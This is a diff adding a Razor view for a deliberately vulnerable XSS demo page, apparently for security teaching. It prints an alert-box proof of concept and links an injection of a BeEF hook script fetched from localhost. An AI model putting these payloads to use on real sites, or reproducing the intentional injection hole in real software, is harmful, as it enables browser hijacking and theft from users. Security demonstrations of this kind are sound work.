@@ -1,0 +1,35 @@
+﻿@model dynamic
+
+@{
+    ViewBag.Title = "Xss vulnerability";
+            //Layout = "~/_Layout";
+}
+
+<h2>Xss demo</h2>
+<div>
+    <p>
+        This page is vulnerable to XSS through the <strong>input</strong> parameter.
+        @Html.ActionLink("Click here", "Index", new { input = "Some input." }) to supply some input.
+    </p>
+    @if (ViewBag.Input != null)
+    {
+        <p>
+            Your input was: @ViewBag.Input
+        </p>
+    }
+    <hr/>
+    <p>
+        To do the classic Xss proof of concept, supply the following value in the input parameter:
+    </p>
+    <pre>
+        &lt;script&gt;alert(0)&lt;/script&gt;
+    </pre>
+
+    
+</div>
+<div>
+    <p>
+        To inject the BeEF hook script through the input parameter, <a href="@Url.Action("Index", new { input = new HtmlString("<script src=\"http://127.0.0.1:3000/hook.js\"></script>") })">Click here</a>.
+    </p>
+    <p>Note: Beef must be running on the default port on localhost.</p>
+</div>
